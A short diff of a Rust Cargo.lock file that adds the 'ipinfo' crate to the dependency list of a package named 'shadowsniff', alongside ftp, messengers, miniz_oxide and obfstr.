@@ -116,6 +116,7 @@ name = "shadowsniff"
 version = "0.1.0"
 dependencies = [
  "ftp",
+ "ipinfo",
  "messengers",
  "miniz_oxide",
  "obfstr",
